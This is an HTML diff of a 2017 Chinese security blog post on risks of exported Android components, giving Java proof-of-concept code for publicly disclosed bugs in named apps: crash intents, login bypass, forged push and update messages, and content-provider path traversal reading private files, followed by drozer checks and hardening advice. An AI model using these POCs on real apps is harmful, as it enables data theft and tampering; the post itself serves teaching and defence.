@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                Android组件暴露的安全性 |
+                    
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Android组件暴露的安全性</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">langu_xyz</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2017-06-19 21:00:00
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Mobi/">Mobi</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.1k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>9 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h3 id="0x01-关于组件"><a href="#0x01-关于组件" class="headerlink" title="0x01 关于组件"></a>0x01 关于组件</h3><p>Android开发四大组件分别是：<br><code>活动(Activity)：用于表现功能</code><br><code>服务(Service)：后台运行服务，不提供界面呈现</code><br><code>广播接收器(BroadcastReceiver)：用于接收广播</code><br><code>内容提供商（ContentProvider）：支持在多个应用中存储和读取数据，相当于数据库</code><br><a class="link" target="_blank" rel="noopener" href="http://www.cnblogs.com/bravestarrhu/archive/2012/05/02/2479461.html">外链:详细讲解<i class="fas fa-external-link-alt"></i></a></p>
+<p>在Android应用中，多一个组件暴露，就多一个攻击面。而攻击者就可以围绕这些攻击面进行测试，构造多种攻击手段。</p>
+<h3 id="0x02-exported属性"><a href="#0x02-exported属性" class="headerlink" title="0x02 exported属性"></a>0x02 exported属性</h3><p>在AndroidManifest.xml文件中，四大组件都有android:exported属性，是个boolean值，可以为true或false<br>这里有个值得注意的点<br><code>默认值以有无intent-filter的action属性来决定，有则为true，没有则为false</code></p>
+<h3 id="0x03-实例"><a href="#0x03-实例" class="headerlink" title="0x03 实例"></a>0x03 实例</h3><h4 id="1、最常见的莫过于本地拒绝服务漏洞，四大组件都存在这个问题"><a href="#1、最常见的莫过于本地拒绝服务漏洞，四大组件都存在这个问题" class="headerlink" title="1、最常见的莫过于本地拒绝服务漏洞，四大组件都存在这个问题"></a>1、最常见的莫过于<code>本地拒绝服务漏洞</code>，四大组件都存在这个问题</h4><p>Android应用本地拒绝服务漏洞源于程序没有对Intent.getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来达到使该应用crash的目的，简单的说就是攻击者通过intent发送空数据、异常或畸形数据给受害者应用，导致其崩溃</p>
+<p>例如导出的Broadcast Receiver组件可以被第三方APP任意调用，如果再没有对消息进行验证，就可能导致敏感信息泄露，并可能受到权限绕过、拒绝服务等攻击风险</p>
+<h6 id="e-g-某手机管家com-tencent-qqpimsecure-service-InOutCallReceiver广播组件没有对消息进行校验，传入空消息导致NullPointerException异常"><a href="#e-g-某手机管家com-tencent-qqpimsecure-service-InOutCallReceiver广播组件没有对消息进行校验，传入空消息导致NullPointerException异常" class="headerlink" title="e.g. 某手机管家com.tencent.qqpimsecure.service.InOutCallReceiver广播组件没有对消息进行校验，传入空消息导致NullPointerException异常"></a>e.g. 某手机管家com.tencent.qqpimsecure.service.InOutCallReceiver广播组件没有对消息进行校验，传入空消息导致NullPointerException异常</h6><p>POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Intent i = new Intent();</span><br><span class="line">ComponentName componetName = new ComponentName(  &quot;com.tencent.qqpimsecure&quot;,  &quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;);         </span><br><span class="line">i.setComponent(componetName);       </span><br><span class="line">sendBroadcast(i);</span><br></pre></td></tr></table></figure>
+<p><img lazyload src="/images/loading.svg" data-src="15190503919800.png"></p>
+<p><a class="link" target="_blank" rel="noopener" href="http://jaq.alibaba.com/blog.htm?id=55">漏洞详情及解决方案<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="2、绕过本地认证"><a href="#2、绕过本地认证" class="headerlink" title="2、绕过本地认证"></a>2、绕过本地认证</h4><p>私有Activity不应被其他应用启动相对是安全的（只是相对的）<br>公开暴露的Activity组件，可以被任意应用启动</p>
+<h6 id="e-g-某菊花网盘绕过本地密码"><a href="#e-g-某菊花网盘绕过本地密码" class="headerlink" title="e.g. 某菊花网盘绕过本地密码"></a>e.g. 某菊花网盘绕过本地密码</h6><p>非root的话直接启动其他activity即可绕过认证，本地认证只是简单topActivity</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public void activityStart(View v) &#123;</span><br><span class="line">		ComponentName componetName = new ComponentName(&quot;com.huawei.dbank.v7&quot;,</span><br><span class="line">				&quot;com.huawei.dbank.v7.ui.newbietask.NewbieTaskActivity&quot;);</span><br><span class="line">		try &#123;</span><br><span class="line">			Intent intent = new Intent();</span><br><span class="line">			intent.setComponent(componetName);</span><br><span class="line">			startActivity(intent);</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			Toast.makeText(getApplicationContext(), &quot;Not found&quot;, 0).show();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="e-g-控制MIUI的手电筒开关（有趣的案例）"><a href="#e-g-控制MIUI的手电筒开关（有趣的案例）" class="headerlink" title="e.g. 控制MIUI的手电筒开关（有趣的案例）"></a>e.g. 控制MIUI的手电筒开关（有趣的案例）</h6><p>MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = new Intent();</span><br><span class="line">        intent.setAction(&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;);</span><br><span class="line">        sendBroadcast(intent);</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、伪造消息代码执行"><a href="#3、伪造消息代码执行" class="headerlink" title="3、伪造消息代码执行"></a>3、伪造消息代码执行</h4><p>广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码</p>
+<h6 id="e-g-某搜索引擎云盘"><a href="#e-g-某搜索引擎云盘" class="headerlink" title="e.g. 某搜索引擎云盘"></a>e.g. 某搜索引擎云盘</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Intent i = new Intent();</span><br><span class="line">        i.setAction(&quot;com.baidu.android.pushservice.action.MESSAGE&quot;);</span><br><span class="line">        Bundle b = new Bundle();</span><br><span class="line">        try &#123;</span><br><span class="line">        	JSONObject jsobject = new JSONObject();</span><br><span class="line">            JSONObject custom_content_js = new JSONObject();</span><br><span class="line">        	jsobject.put(&quot;title&quot;, &quot;xxxxxxxxxxx&quot;);</span><br><span class="line">        	jsobject.put(&quot;description&quot;, &quot;&quot;)</span><br><span class="line">        	jsobject.put(&quot;url&quot;, &quot;http://drops.wooyun.org/webview.html&quot;);</span><br><span class="line">        	JSONObject customcontent_js = new JSONObject();       	</span><br><span class="line">        	customcontent_js.put(&quot;type&quot;, &quot;1&quot;);</span><br><span class="line">        	customcontent_js.put(&quot;msg_type&quot;, &quot;resources_push&quot;);</span><br><span class="line">        	customcontent_js.put(&quot;uk&quot;, &quot;1&quot;);</span><br><span class="line">        	customcontent_js.put(&quot;shareId&quot;, &quot;1&quot;);  	</span><br><span class="line">        	jsobject.put(&quot;custom_content&quot;, customcontent_js);   </span><br><span class="line">			String cmd  = jsobject.toString();</span><br><span class="line">			b.putByteArray(&quot;message&quot;, cmd.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h6 id="e-g-优酷Android-4-5客户端升级漏洞"><a href="#e-g-优酷Android-4-5客户端升级漏洞" class="headerlink" title="e.g. 优酷Android 4.5客户端升级漏洞"></a>e.g. 优酷Android 4.5客户端升级漏洞</h6><p>com.youku.service.push.StartActivityService组件从Intent从获取名为PushMsg的Serializable的数据，并根据其成员type来执行不同的流程，当type值为1时，执行App的升级操作。升级所需的相关数据如app的下载地址等也是从该序列化数据中获取。升级的具体流程在com.youku.ui.activity.UpdateActivity中，简单分析后发现升级过程未对下载地址等进行判断，因此可以任意指定该地址</p>
+<p>POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PushMsg pushMsg = new PushMsg();</span><br><span class="line">pushMsg.type = 1;</span><br><span class="line">pushMsg.updateurl = &quot;http://**.**.**.**/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;;</span><br><span class="line">pushMsg.updatecontent = &quot;This is Fake&quot;;</span><br><span class="line">Intent intent = new Intent();</span><br><span class="line">intent.setClassName(&quot;com.youku.phone&quot;,&quot;com.youku.service.push.StartActivityService&quot;);</span><br><span class="line">intent.putExtra(&quot;PushMsg&quot;, pushMsg);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>
+
+<h4 id="4、敏感信息泄漏"><a href="#4、敏感信息泄漏" class="headerlink" title="4、敏感信息泄漏"></a>4、敏感信息泄漏</h4><h6 id="e-g-某应用隐式intent发送敏感信息"><a href="#e-g-某应用隐式intent发送敏感信息" class="headerlink" title="e.g. 某应用隐式intent发送敏感信息"></a>e.g. 某应用隐式intent发送敏感信息</h6><p>缺陷代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class ServerService extends Service &#123;</span><br><span class="line">  private void d() &#123;</span><br><span class="line">    Intent v1 = new Intent();</span><br><span class="line">    v1.setAction(&quot;com.sample.action.server_running&quot;);</span><br><span class="line">    v1.putExtra(&quot;local_ip&quot;, v0.h);</span><br><span class="line">    v1.putExtra(&quot;port&quot;, v0.i);</span><br><span class="line">    v1.putExtra(&quot;code&quot;, v0.g);</span><br><span class="line">    v1.putExtra(&quot;connected&quot;, v0.s);</span><br><span class="line">    v1.putExtra(&quot;pwd_predefined&quot;, v0.r);</span><br><span class="line">    if (!TextUtils.isEmpty(v0.t)) &#123;</span><br><span class="line">      v1.putExtra(&quot;connected_usr&quot;, v0.t);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  this.sendBroadcast(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class BcReceiv extends BroadcastReceiver &#123;</span><br><span class="line">  @Override</span><br><span class="line">  public void onReceive(Context context, Intent intent)&#123;</span><br><span class="line">    String s = null;</span><br><span class="line">    if (intent.getAction().equals(&quot;com.sample.action.server_running&quot;))&#123;</span><br><span class="line">      String pwd = intent.getStringExtra(&quot;connected&quot;);</span><br><span class="line">      s = &quot;Airdroid  =&gt; [&quot; + pwd + &quot;]/&quot; + intent.getExtras();</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(context, String.format(&quot;%s Received&quot;, s),</span><br><span class="line">                   Toast.LENGTH_SHORT).show();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="5、提升权限"><a href="#5、提升权限" class="headerlink" title="5、提升权限"></a>5、提升权限</h4><h6 id="e-g-某系统清理工具"><a href="#e-g-某系统清理工具" class="headerlink" title="e.g. 某系统清理工具"></a>e.g. 某系统清理工具</h6><p>暴露了com.cleanmaster.appwidget.WidgetService服务组件，当向此服务发送action为com.cleanmaster.appwidget.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程<br><img lazyload src="/images/loading.svg" data-src="15190503814605.png"></p>
+<h4 id="6、Content-Provider-暴露泄露敏感信息"><a href="#6、Content-Provider-暴露泄露敏感信息" class="headerlink" title="6、Content Provider 暴露泄露敏感信息"></a>6、Content Provider 暴露泄露敏感信息</h4><p>Content Provider 用来存放和获取数据并使这些数据可以被所有的应用程序访问，是应用程序之间共享数据的唯一方法</p>
+<h6 id="e-g-一只眼app应用本地信息泄露"><a href="#e-g-一只眼app应用本地信息泄露" class="headerlink" title="e.g. 一只眼app应用本地信息泄露"></a>e.g. 一只眼app应用本地信息泄露</h6><p>任意Android程序不需要任何权限就能获取本机一支眼app的所有数据，包括账号、私信聊天记录</p>
+<p>查看聊天记录POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public void getChatMsg() &#123;</span><br><span class="line">    	String[] projection = &#123;&quot;* from im_message_table--&quot;&#125;;</span><br><span class="line">    	Uri uri = Uri.parse(&quot;content://com.sina.weibo.blogProvider/query/im&quot;);</span><br><span class="line">    	Cursor mCursor = getContentResolver().query(uri, projection, null, null, null);</span><br><span class="line">    	if (null == mCursor) &#123;</span><br><span class="line">    		Toast.makeText(mContext, &quot;null cursor&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">    	&#125; else if (mCursor.getCount() &lt; 1) &#123;</span><br><span class="line">    		Toast.makeText(mContext, &quot;count less than 1&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">    	&#125; else &#123;</span><br><span class="line">    		String text = &quot;&quot;;</span><br><span class="line">    		while (mCursor.moveToNext()) &#123;</span><br><span class="line">    	        text += mCursor.getString(mCursor.getColumnIndex(&quot;content&quot;));</span><br><span class="line">    	    &#125;</span><br><span class="line">    		mTextView.setText(text);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="7、任意文件读取漏洞"><a href="#7、任意文件读取漏洞" class="headerlink" title="7、任意文件读取漏洞"></a>7、任意文件读取漏洞</h4><h6 id="e-g-某客户端Content-Provider组件任意文件读取漏洞"><a href="#e-g-某客户端Content-Provider组件任意文件读取漏洞" class="headerlink" title="e.g. 某客户端Content Provider组件任意文件读取漏洞"></a>e.g. 某客户端Content Provider组件任意文件读取漏洞</h6><p>某客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported=”true”,对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过”../“实现目录跨越，实现对任意私有数据的访问</p>
+<p>POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public void GJContentProviderFileOperations()&#123; </span><br><span class="line">    try&#123; </span><br><span class="line">	    InputStream in = getContentResolver().openInputStream(Uri.parse(&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;)); </span><br><span class="line">		ByteArrayOutputStream out = new ByteArrayOutputStream(); </span><br><span class="line">		byte[] buffer = new byte[1024]; </span><br><span class="line">		int n = in.read(buffer); </span><br><span class="line">		while(n&gt;0)&#123; </span><br><span class="line">		    out.write(buffer, 0, n); </span><br><span class="line">			n = in.read(buffer); </span><br><span class="line">			Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show(); </span><br><span class="line">	    &#125; </span><br><span class="line">	&#125;catch(Exception e)&#123; </span><br><span class="line">	    debugInfo(e.getMessage()); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><a class="link" target="_blank" rel="noopener" href="https://jaq.alibaba.com/blog.htm?id=61">漏洞详解<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="8、启动私有组件（这就是前边提到的，私有组件也仅仅是相对安全的）"><a href="#8、启动私有组件（这就是前边提到的，私有组件也仅仅是相对安全的）" class="headerlink" title="8、启动私有组件（这就是前边提到的，私有组件也仅仅是相对安全的）"></a>8、启动私有组件（这就是前边提到的，私有组件也仅仅是相对安全的）</h4><p>存在一个私有组件A，和一个对外导出组件B。如果B能够根据对外传入的Intent中的内容打开私有组件A，同时启动私有组件A的Intent的内容来自启动导出组件B的Intent的内容，那么攻击者就可以通过对外导出组件B，去控制私有导出组件A。这就可能会造成严重的安全风险<br><a class="link" target="_blank" rel="noopener" href="https://jaq.alibaba.com/community/art/show?articleid=834">这里详细的看下聚安全的这篇paper<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="其实还有很多没有列出，如UXSS、界面劫持、services劫持等等"><a href="#其实还有很多没有列出，如UXSS、界面劫持、services劫持等等" class="headerlink" title="其实还有很多没有列出，如UXSS、界面劫持、services劫持等等"></a>其实还有很多没有列出，如UXSS、界面劫持、services劫持等等</h4><h3 id="0x04-简单自测"><a href="#0x04-简单自测" class="headerlink" title="0x04 简单自测"></a>0x04 简单自测</h3><h4 id="1、反编译APK或直接查看源代码"><a href="#1、反编译APK或直接查看源代码" class="headerlink" title="1、反编译APK或直接查看源代码"></a>1、反编译APK或直接查看源代码</h4><p>查看AndroidManifest.xml文件，查看哪些组件是导出的，仔细check是否需要导出，需要导出的是否都已做了相应的安全限制</p>
+<h4 id="2、drozer扫描"><a href="#2、drozer扫描" class="headerlink" title="2、drozer扫描"></a>2、drozer扫描</h4><p><code>run app.activity.info -a packagename</code></p>
+<h3 id="0x05-防患于未然"><a href="#0x05-防患于未然" class="headerlink" title="0x05 防患于未然"></a>0x05 防患于未然</h3><p>1、能不导出组件的坚决不导出<br>2、必须导出的组件仔细check限制策略是否到位<br>3、检查该组件能不能根据该组件的intent去启动其他私有组件<br>4、如果能启动私有组件，根据业务严格控制过滤和校验intent中的内容，同时被启动的私有组件需要做好各种安全防范</p>
+<blockquote>
+<blockquote>
+<p>关于漏洞例子：本来想用最近遇到的问题来做实例，但考虑到漏洞的敏感性，找的是网上公开的漏洞</p>
+</blockquote>
+</blockquote>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Android组件暴露的安全性</li>
+        <li>Post author：langu_xyz</li>
+        <li>Create time：2017-06-19 21:00:00</li>
+        <li>
+            Post link：https://blog.langu.xyz/Android组件暴露的安全性/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6TIPS/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">社会工程学TIPS</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/Chrome%20XSS%20Auditor%20Bypass%20Payload/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Chrome XSS Auditor Bypass Payload</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
